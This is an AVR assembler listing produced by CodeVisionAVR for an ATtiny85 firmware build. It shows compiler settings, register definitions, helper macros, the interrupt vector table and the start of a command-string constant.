
AVRASM ver. 2.1.30  C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm Sun Feb 15 13:30:09 2026

                 
                 
                 ;CodeVisionAVR C Compiler V3.14 Advanced
                 ;(C) Copyright 1998-2014 Pavel Haiduc, HP InfoTech s.r.l.
                 ;http://www.hpinfotech.com
                 
                 ;Build configuration    : Debug
                 ;Chip type              : ATtiny85
                 ;Program type           : Application
                 ;Clock frequency        : 8.000000 MHz
                 ;Memory model           : Small
                 ;Optimize for           : Size
                 ;(s)printf features     : int, width
                 ;(s)scanf features      : int, width
                 ;External RAM size      : 0
                 ;Data Stack size        : 128 byte(s)
                 ;Heap size              : 0 byte(s)
                 ;Promote 'char' to 'int': Yes
                 ;'char' is unsigned     : Yes
                 ;8 bit enums            : Yes
                 ;Global 'const' stored in FLASH: No
                 ;Enhanced function parameter passing: Yes
                 ;Enhanced core instructions: On
                 ;Automatic register allocation for global variables: On
                 ;Smart register allocation: On
                 
                 	#define _MODEL_SMALL_
                 
                 	#pragma AVRPART ADMIN PART_NAME ATtiny85
                 	#pragma AVRPART MEMORY PROG_FLASH 8192
                 	#pragma AVRPART MEMORY EEPROM 512
                 	#pragma AVRPART MEMORY INT_SRAM SIZE 512
                 	#pragma AVRPART MEMORY INT_SRAM START_ADDR 0x60
                 
                 	.LISTMAC
                 	.EQU EERE=0x0
                 	.EQU EEWE=0x1
                 	.EQU EEMWE=0x2
                 	.EQU EECR=0x1C
                 	.EQU EEDR=0x1D
                 	.EQU EEARL=0x1E
                 
                 	.EQU EEARH=0x1F
                 	.EQU WDTCR=0x21
                 	.EQU MCUSR=0x34
                 	.EQU MCUCR=0x35
                 	.EQU SPL=0x3D
                 	.EQU SPH=0x3E
                 	.EQU SREG=0x3F
                 	.EQU GPIOR0=0x11
                 	.EQU GPIOR1=0x12
                 	.EQU GPIOR2=0x13
                 
                 	.DEF R0X0=R0
                 	.DEF R0X1=R1
                 	.DEF R0X2=R2
                 	.DEF R0X3=R3
                 	.DEF R0X4=R4
                 	.DEF R0X5=R5
                 	.DEF R0X6=R6
                 	.DEF R0X7=R7
                 	.DEF R0X8=R8
                 	.DEF R0X9=R9
                 	.DEF R0XA=R10
                 	.DEF R0XB=R11
                 	.DEF R0XC=R12
                 	.DEF R0XD=R13
                 	.DEF R0XE=R14
                 	.DEF R0XF=R15
                 	.DEF R0X10=R16
                 	.DEF R0X11=R17
                 	.DEF R0X12=R18
                 	.DEF R0X13=R19
                 	.DEF R0X14=R20
                 	.DEF R0X15=R21
                 	.DEF R0X16=R22
                 	.DEF R0X17=R23
                 	.DEF R0X18=R24
                 	.DEF R0X19=R25
                 	.DEF R0X1A=R26
                 	.DEF R0X1B=R27
                 	.DEF R0X1C=R28
                 	.DEF R0X1D=R29
                 	.DEF R0X1E=R30
                 	.DEF R0X1F=R31
                 
                 	.EQU __SRAM_START=0x0060
                 	.EQU __SRAM_END=0x025F
                 	.EQU __DSTACK_SIZE=0x0080
                 	.EQU __HEAP_SIZE=0x0000
                 	.EQU __CLEAR_SRAM_SIZE=__SRAM_END-__SRAM_START+1
                 
                 	.MACRO __CPD1N
                 	CPI  R30,LOW(@0)
                 	LDI  R26,HIGH(@0)
                 	CPC  R31,R26
                 	LDI  R26,BYTE3(@0)
                 	CPC  R22,R26
                 	LDI  R26,BYTE4(@0)
                 	CPC  R23,R26
                 	.ENDM
                 
                 	.MACRO __CPD2N
                 	CPI  R26,LOW(@0)
                 	LDI  R30,HIGH(@0)
                 	CPC  R27,R30
                 	LDI  R30,BYTE3(@0)
                 	CPC  R24,R30
                 	LDI  R30,BYTE4(@0)
                 	CPC  R25,R30
                 	.ENDM
                 
                 	.MACRO __CPWRR
                 	CP   R@0,R@2
                 	CPC  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __CPWRN
                 	CPI  R@0,LOW(@2)
                 	LDI  R30,HIGH(@2)
                 	CPC  R@1,R30
                 	.ENDM
                 
                 	.MACRO __ADDB1MN
                 	SUBI R30,LOW(-@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDB2MN
                 	SUBI R26,LOW(-@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDW1MN
                 	SUBI R30,LOW(-@0-(@1))
                 	SBCI R31,HIGH(-@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDW2MN
                 	SUBI R26,LOW(-@0-(@1))
                 	SBCI R27,HIGH(-@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDW1FN
                 	SUBI R30,LOW(-2*@0-(@1))
                 	SBCI R31,HIGH(-2*@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDD1FN
                 	SUBI R30,LOW(-2*@0-(@1))
                 	SBCI R31,HIGH(-2*@0-(@1))
                 	SBCI R22,BYTE3(-2*@0-(@1))
                 	.ENDM
                 
                 	.MACRO __ADDD1N
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	SBCI R22,BYTE3(-@0)
                 	SBCI R23,BYTE4(-@0)
                 	.ENDM
                 
                 	.MACRO __ADDD2N
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	SBCI R24,BYTE3(-@0)
                 	SBCI R25,BYTE4(-@0)
                 	.ENDM
                 
                 	.MACRO __SUBD1N
                 	SUBI R30,LOW(@0)
                 	SBCI R31,HIGH(@0)
                 	SBCI R22,BYTE3(@0)
                 	SBCI R23,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __SUBD2N
                 	SUBI R26,LOW(@0)
                 	SBCI R27,HIGH(@0)
                 	SBCI R24,BYTE3(@0)
                 	SBCI R25,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __ANDBMNN
                 	LDS  R30,@0+(@1)
                 	ANDI R30,LOW(@2)
                 	STS  @0+(@1),R30
                 	.ENDM
                 
                 	.MACRO __ANDWMNN
                 	LDS  R30,@0+(@1)
                 	ANDI R30,LOW(@2)
                 	STS  @0+(@1),R30
                 	LDS  R30,@0+(@1)+1
                 	ANDI R30,HIGH(@2)
                 	STS  @0+(@1)+1,R30
                 	.ENDM
                 
                 	.MACRO __ANDD1N
                 	ANDI R30,LOW(@0)
                 	ANDI R31,HIGH(@0)
                 	ANDI R22,BYTE3(@0)
                 	ANDI R23,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __ANDD2N
                 	ANDI R26,LOW(@0)
                 	ANDI R27,HIGH(@0)
                 	ANDI R24,BYTE3(@0)
                 	ANDI R25,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __ORBMNN
                 	LDS  R30,@0+(@1)
                 	ORI  R30,LOW(@2)
                 	STS  @0+(@1),R30
                 	.ENDM
                 
                 	.MACRO __ORWMNN
                 	LDS  R30,@0+(@1)
                 	ORI  R30,LOW(@2)
                 	STS  @0+(@1),R30
                 	LDS  R30,@0+(@1)+1
                 	ORI  R30,HIGH(@2)
                 	STS  @0+(@1)+1,R30
                 	.ENDM
                 
                 	.MACRO __ORD1N
                 	ORI  R30,LOW(@0)
                 	ORI  R31,HIGH(@0)
                 	ORI  R22,BYTE3(@0)
                 	ORI  R23,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __ORD2N
                 	ORI  R26,LOW(@0)
                 	ORI  R27,HIGH(@0)
                 	ORI  R24,BYTE3(@0)
                 	ORI  R25,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __DELAY_USB
                 	LDI  R24,LOW(@0)
                 __DELAY_USB_LOOP:
                 	DEC  R24
                 	BRNE __DELAY_USB_LOOP
                 	.ENDM
                 
                 	.MACRO __DELAY_USW
                 	LDI  R24,LOW(@0)
                 	LDI  R25,HIGH(@0)
                 __DELAY_USW_LOOP:
                 	SBIW R24,1
                 	BRNE __DELAY_USW_LOOP
                 	.ENDM
                 
                 	.MACRO __GETD1S
                 	LDD  R30,Y+@0
                 	LDD  R31,Y+@0+1
                 	LDD  R22,Y+@0+2
                 	LDD  R23,Y+@0+3
                 	.ENDM
                 
                 	.MACRO __GETD2S
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	LDD  R24,Y+@0+2
                 	LDD  R25,Y+@0+3
                 	.ENDM
                 
                 	.MACRO __PUTD1S
                 	STD  Y+@0,R30
                 	STD  Y+@0+1,R31
                 	STD  Y+@0+2,R22
                 	STD  Y+@0+3,R23
                 	.ENDM
                 
                 	.MACRO __PUTD2S
                 	STD  Y+@0,R26
                 	STD  Y+@0+1,R27
                 	STD  Y+@0+2,R24
                 	STD  Y+@0+3,R25
                 	.ENDM
                 
                 	.MACRO __PUTDZ2
                 	STD  Z+@0,R26
                 	STD  Z+@0+1,R27
                 	STD  Z+@0+2,R24
                 	STD  Z+@0+3,R25
                 	.ENDM
                 
                 	.MACRO __CLRD1S
                 	STD  Y+@0,R30
                 	STD  Y+@0+1,R30
                 	STD  Y+@0+2,R30
                 	STD  Y+@0+3,R30
                 	.ENDM
                 
                 	.MACRO __POINTB1MN
                 	LDI  R30,LOW(@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTW1MN
                 	LDI  R30,LOW(@0+(@1))
                 	LDI  R31,HIGH(@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTD1M
                 	LDI  R30,LOW(@0)
                 	LDI  R31,HIGH(@0)
                 	LDI  R22,BYTE3(@0)
                 	LDI  R23,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __POINTW1FN
                 	LDI  R30,LOW(2*@0+(@1))
                 	LDI  R31,HIGH(2*@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTD1FN
                 	LDI  R30,LOW(2*@0+(@1))
                 	LDI  R31,HIGH(2*@0+(@1))
                 	LDI  R22,BYTE3(2*@0+(@1))
                 	LDI  R23,BYTE4(2*@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTB2MN
                 	LDI  R26,LOW(@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTW2MN
                 	LDI  R26,LOW(@0+(@1))
                 	LDI  R27,HIGH(@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTW2FN
                 	LDI  R26,LOW(2*@0+(@1))
                 	LDI  R27,HIGH(2*@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTD2FN
                 	LDI  R26,LOW(2*@0+(@1))
                 	LDI  R27,HIGH(2*@0+(@1))
                 	LDI  R24,BYTE3(2*@0+(@1))
                 	LDI  R25,BYTE4(2*@0+(@1))
                 	.ENDM
                 
                 	.MACRO __POINTBRM
                 	LDI  R@0,LOW(@1)
                 	.ENDM
                 
                 	.MACRO __POINTWRM
                 	LDI  R@0,LOW(@2)
                 	LDI  R@1,HIGH(@2)
                 	.ENDM
                 
                 	.MACRO __POINTBRMN
                 	LDI  R@0,LOW(@1+(@2))
                 	.ENDM
                 
                 	.MACRO __POINTWRMN
                 	LDI  R@0,LOW(@2+(@3))
                 	LDI  R@1,HIGH(@2+(@3))
                 	.ENDM
                 
                 	.MACRO __POINTWRFN
                 	LDI  R@0,LOW(@2*2+(@3))
                 	LDI  R@1,HIGH(@2*2+(@3))
                 	.ENDM
                 
                 	.MACRO __GETD1N
                 	LDI  R30,LOW(@0)
                 	LDI  R31,HIGH(@0)
                 	LDI  R22,BYTE3(@0)
                 	LDI  R23,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __GETD2N
                 	LDI  R26,LOW(@0)
                 	LDI  R27,HIGH(@0)
                 	LDI  R24,BYTE3(@0)
                 	LDI  R25,BYTE4(@0)
                 	.ENDM
                 
                 	.MACRO __GETB1MN
                 	LDS  R30,@0+(@1)
                 	.ENDM
                 
                 	.MACRO __GETB1HMN
                 	LDS  R31,@0+(@1)
                 	.ENDM
                 
                 	.MACRO __GETW1MN
                 	LDS  R30,@0+(@1)
                 	LDS  R31,@0+(@1)+1
                 	.ENDM
                 
                 	.MACRO __GETD1MN
                 	LDS  R30,@0+(@1)
                 	LDS  R31,@0+(@1)+1
                 	LDS  R22,@0+(@1)+2
                 	LDS  R23,@0+(@1)+3
                 	.ENDM
                 
                 	.MACRO __GETBRMN
                 	LDS  R@0,@1+(@2)
                 	.ENDM
                 
                 	.MACRO __GETWRMN
                 	LDS  R@0,@2+(@3)
                 	LDS  R@1,@2+(@3)+1
                 	.ENDM
                 
                 	.MACRO __GETWRZ
                 	LDD  R@0,Z+@2
                 	LDD  R@1,Z+@2+1
                 	.ENDM
                 
                 	.MACRO __GETD2Z
                 	LDD  R26,Z+@0
                 	LDD  R27,Z+@0+1
                 	LDD  R24,Z+@0+2
                 	LDD  R25,Z+@0+3
                 	.ENDM
                 
                 	.MACRO __GETB2MN
                 	LDS  R26,@0+(@1)
                 	.ENDM
                 
                 	.MACRO __GETW2MN
                 	LDS  R26,@0+(@1)
                 	LDS  R27,@0+(@1)+1
                 	.ENDM
                 
                 	.MACRO __GETD2MN
                 	LDS  R26,@0+(@1)
                 	LDS  R27,@0+(@1)+1
                 	LDS  R24,@0+(@1)+2
                 	LDS  R25,@0+(@1)+3
                 	.ENDM
                 
                 	.MACRO __PUTB1MN
                 	STS  @0+(@1),R30
                 	.ENDM
                 
                 	.MACRO __PUTW1MN
                 	STS  @0+(@1),R30
                 	STS  @0+(@1)+1,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1MN
                 	STS  @0+(@1),R30
                 	STS  @0+(@1)+1,R31
                 	STS  @0+(@1)+2,R22
                 	STS  @0+(@1)+3,R23
                 	.ENDM
                 
                 	.MACRO __PUTB1EN
                 	LDI  R26,LOW(@0+(@1))
                 	LDI  R27,HIGH(@0+(@1))
                 	RCALL __EEPROMWRB
                 	.ENDM
                 
                 	.MACRO __PUTW1EN
                 	LDI  R26,LOW(@0+(@1))
                 	LDI  R27,HIGH(@0+(@1))
                 	RCALL __EEPROMWRW
                 	.ENDM
                 
                 	.MACRO __PUTD1EN
                 	LDI  R26,LOW(@0+(@1))
                 	LDI  R27,HIGH(@0+(@1))
                 	RCALL __EEPROMWRD
                 	.ENDM
                 
                 	.MACRO __PUTBR0MN
                 	STS  @0+(@1),R0
                 	.ENDM
                 
                 	.MACRO __PUTBMRN
                 	STS  @0+(@1),R@2
                 	.ENDM
                 
                 	.MACRO __PUTWMRN
                 	STS  @0+(@1),R@2
                 	STS  @0+(@1)+1,R@3
                 	.ENDM
                 
                 	.MACRO __PUTBZR
                 	STD  Z+@1,R@0
                 	.ENDM
                 
                 	.MACRO __PUTWZR
                 	STD  Z+@2,R@0
                 	STD  Z+@2+1,R@1
                 	.ENDM
                 
                 	.MACRO __GETW1R
                 	MOV  R30,R@0
                 	MOV  R31,R@1
                 	.ENDM
                 
                 	.MACRO __GETW2R
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	.ENDM
                 
                 	.MACRO __GETWRN
                 	LDI  R@0,LOW(@2)
                 	LDI  R@1,HIGH(@2)
                 	.ENDM
                 
                 	.MACRO __PUTW1R
                 	MOV  R@0,R30
                 	MOV  R@1,R31
                 	.ENDM
                 
                 	.MACRO __PUTW2R
                 	MOV  R@0,R26
                 	MOV  R@1,R27
                 	.ENDM
                 
                 	.MACRO __ADDWRN
                 	SUBI R@0,LOW(-@2)
                 	SBCI R@1,HIGH(-@2)
                 	.ENDM
                 
                 	.MACRO __ADDWRR
                 	ADD  R@0,R@2
                 	ADC  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __SUBWRN
                 	SUBI R@0,LOW(@2)
                 	SBCI R@1,HIGH(@2)
                 	.ENDM
                 
                 	.MACRO __SUBWRR
                 	SUB  R@0,R@2
                 	SBC  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __ANDWRN
                 	ANDI R@0,LOW(@2)
                 	ANDI R@1,HIGH(@2)
                 	.ENDM
                 
                 	.MACRO __ANDWRR
                 	AND  R@0,R@2
                 	AND  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __ORWRN
                 	ORI  R@0,LOW(@2)
                 	ORI  R@1,HIGH(@2)
                 	.ENDM
                 
                 	.MACRO __ORWRR
                 	OR   R@0,R@2
                 	OR   R@1,R@3
                 	.ENDM
                 
                 	.MACRO __EORWRR
                 	EOR  R@0,R@2
                 	EOR  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __GETWRS
                 	LDD  R@0,Y+@2
                 	LDD  R@1,Y+@2+1
                 	.ENDM
                 
                 	.MACRO __PUTBSR
                 	STD  Y+@1,R@0
                 	.ENDM
                 
                 	.MACRO __PUTWSR
                 	STD  Y+@2,R@0
                 	STD  Y+@2+1,R@1
                 	.ENDM
                 
                 	.MACRO __MOVEWRR
                 	MOV  R@0,R@2
                 	MOV  R@1,R@3
                 	.ENDM
                 
                 	.MACRO __INWR
                 	IN   R@0,@2
                 	IN   R@1,@2+1
                 	.ENDM
                 
                 	.MACRO __OUTWR
                 	OUT  @2+1,R@1
                 	OUT  @2,R@0
                 	.ENDM
                 
                 	.MACRO __CALL1MN
                 	LDS  R30,@0+(@1)
                 	LDS  R31,@0+(@1)+1
                 	ICALL
                 	.ENDM
                 
                 	.MACRO __CALL1FN
                 	LDI  R30,LOW(2*@0+(@1))
                 	LDI  R31,HIGH(2*@0+(@1))
                 	RCALL __GETW1PF
                 	ICALL
                 	.ENDM
                 
                 	.MACRO __CALL2EN
                 	PUSH R26
                 	PUSH R27
                 	LDI  R26,LOW(@0+(@1))
                 	LDI  R27,HIGH(@0+(@1))
                 	RCALL __EEPROMRDW
                 	POP  R27
                 	POP  R26
                 	ICALL
                 	.ENDM
                 
                 	.MACRO __CALL2EX
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	RCALL __EEPROMRDD
                 	ICALL
                 	.ENDM
                 
                 	.MACRO __GETW1STACK
                 	IN   R30,SPL
                 	IN   R31,SPH
                 	ADIW R30,@0+1
                 	LD   R0,Z+
                 	LD   R31,Z
                 	MOV  R30,R0
                 	.ENDM
                 
                 	.MACRO __GETD1STACK
                 	IN   R30,SPL
                 	IN   R31,SPH
                 	ADIW R30,@0+1
                 	LD   R0,Z+
                 	LD   R1,Z+
                 	LD   R22,Z
                 	MOVW R30,R0
                 	.ENDM
                 
                 	.MACRO __NBST
                 	BST  R@0,@1
                 	IN   R30,SREG
                 	LDI  R31,0x40
                 	EOR  R30,R31
                 	OUT  SREG,R30
                 	.ENDM
                 
                 
                 	.MACRO __PUTB1SN
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1SN
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1SN
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1SNS
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	ADIW R26,@1
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1SNS
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	ADIW R26,@1
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1SNS
                 	LDD  R26,Y+@0
                 	LDD  R27,Y+@0+1
                 	ADIW R26,@1
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1PMN
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1PMN
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1PMN
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1PMNS
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	ADIW R26,@1
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1PMNS
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	ADIW R26,@1
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1PMNS
                 	LDS  R26,@0
                 	LDS  R27,@0+1
                 	ADIW R26,@1
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1RN
                 	MOVW R26,R@0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1RN
                 	MOVW R26,R@0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1RN
                 	MOVW R26,R@0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1RNS
                 	MOVW R26,R@0
                 	ADIW R26,@1
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1RNS
                 	MOVW R26,R@0
                 	ADIW R26,@1
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1RNS
                 	MOVW R26,R@0
                 	ADIW R26,@1
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1RON
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	SUBI R26,LOW(-@2)
                 	SBCI R27,HIGH(-@2)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1RON
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	SUBI R26,LOW(-@2)
                 	SBCI R27,HIGH(-@2)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1RON
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	SUBI R26,LOW(-@2)
                 	SBCI R27,HIGH(-@2)
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 	.MACRO __PUTB1RONS
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	ADIW R26,@2
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1RONS
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	ADIW R26,@2
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1RONS
                 	MOV  R26,R@0
                 	MOV  R27,R@1
                 	ADIW R26,@2
                 	RCALL __PUTDP1
                 	.ENDM
                 
                 
                 	.MACRO __GETB1SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	LD   R30,Z
                 	.ENDM
                 
                 	.MACRO __GETB1HSX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	LD   R31,Z
                 	.ENDM
                 
                 	.MACRO __GETW1SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	LD   R0,Z+
                 	LD   R31,Z
                 	MOV  R30,R0
                 	.ENDM
                 
                 	.MACRO __GETD1SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	LD   R0,Z+
                 	LD   R1,Z+
                 	LD   R22,Z+
                 	LD   R23,Z
                 	MOVW R30,R0
                 	.ENDM
                 
                 	.MACRO __GETB2SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R26,X
                 	.ENDM
                 
                 	.MACRO __GETW2SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R0,X+
                 	LD   R27,X
                 	MOV  R26,R0
                 	.ENDM
                 
                 	.MACRO __GETD2SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R0,X+
                 	LD   R1,X+
                 	LD   R24,X+
                 	LD   R25,X
                 	MOVW R26,R0
                 	.ENDM
                 
                 	.MACRO __GETBRSX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@1)
                 	SBCI R31,HIGH(-@1)
                 	LD   R@0,Z
                 	.ENDM
                 
                 	.MACRO __GETWRSX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@2)
                 	SBCI R31,HIGH(-@2)
                 	LD   R@0,Z+
                 	LD   R@1,Z
                 	.ENDM
                 
                 	.MACRO __GETBRSX2
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	LD   R@0,X
                 	.ENDM
                 
                 	.MACRO __GETWRSX2
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@2)
                 	SBCI R27,HIGH(-@2)
                 	LD   R@0,X+
                 	LD   R@1,X
                 	.ENDM
                 
                 	.MACRO __LSLW8SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	LD   R31,Z
                 	CLR  R30
                 	.ENDM
                 
                 	.MACRO __PUTB1SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	ST   X+,R30
                 	ST   X+,R31
                 	ST   X+,R22
                 	ST   X,R23
                 	.ENDM
                 
                 	.MACRO __CLRW1SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	ST   X+,R30
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __CLRD1SX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	ST   X+,R30
                 	ST   X+,R30
                 	ST   X+,R30
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTB2SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	ST   Z,R26
                 	.ENDM
                 
                 	.MACRO __PUTW2SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	ST   Z+,R26
                 	ST   Z,R27
                 	.ENDM
                 
                 	.MACRO __PUTD2SX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@0)
                 	SBCI R31,HIGH(-@0)
                 	ST   Z+,R26
                 	ST   Z+,R27
                 	ST   Z+,R24
                 	ST   Z,R25
                 	.ENDM
                 
                 	.MACRO __PUTBSRX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@1)
                 	SBCI R31,HIGH(-@1)
                 	ST   Z,R@0
                 	.ENDM
                 
                 	.MACRO __PUTWSRX
                 	MOVW R30,R28
                 	SUBI R30,LOW(-@2)
                 	SBCI R31,HIGH(-@2)
                 	ST   Z+,R@0
                 	ST   Z,R@1
                 	.ENDM
                 
                 	.MACRO __PUTB1SNX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R0,X+
                 	LD   R27,X
                 	MOV  R26,R0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X,R30
                 	.ENDM
                 
                 	.MACRO __PUTW1SNX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R0,X+
                 	LD   R27,X
                 	MOV  R26,R0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X+,R30
                 	ST   X,R31
                 	.ENDM
                 
                 	.MACRO __PUTD1SNX
                 	MOVW R26,R28
                 	SUBI R26,LOW(-@0)
                 	SBCI R27,HIGH(-@0)
                 	LD   R0,X+
                 	LD   R27,X
                 	MOV  R26,R0
                 	SUBI R26,LOW(-@1)
                 	SBCI R27,HIGH(-@1)
                 	ST   X+,R30
                 	ST   X+,R31
                 	ST   X+,R22
                 	ST   X,R23
                 	.ENDM
                 
                 ;GPIOR0-GPIOR2 INITIALIZATION VALUES
                 	.EQU __GPIOR0_INIT=0x00
                 	.EQU __GPIOR1_INIT=0x00
                 	.EQU __GPIOR2_INIT=0x00
                 
                 	.CSEG
                 	.ORG 0x00
                 
                 ;START OF CODE MARKER
                 __START_OF_CODE:
                 
                 ;INTERRUPT VECTORS
000000 c0c0      	RJMP __RESET
000001 cffe      	RJMP 0x00
000002 cffd      	RJMP 0x00
000003 cffc      	RJMP 0x00
000004 cffb      	RJMP 0x00
000005 cffa      	RJMP 0x00
000006 cff9      	RJMP 0x00
000007 cff8      	RJMP 0x00
000008 cff7      	RJMP 0x00
000009 cff6      	RJMP 0x00
00000a cff5      	RJMP 0x00
00000b cff4      	RJMP 0x00
00000c cff3      	RJMP 0x00
00000d cff2      	RJMP 0x00
00000e cff1      	RJMP 0x00
                 
                 _CMD_RUN:
00000f 4d43
000010 3a44
000011 5552
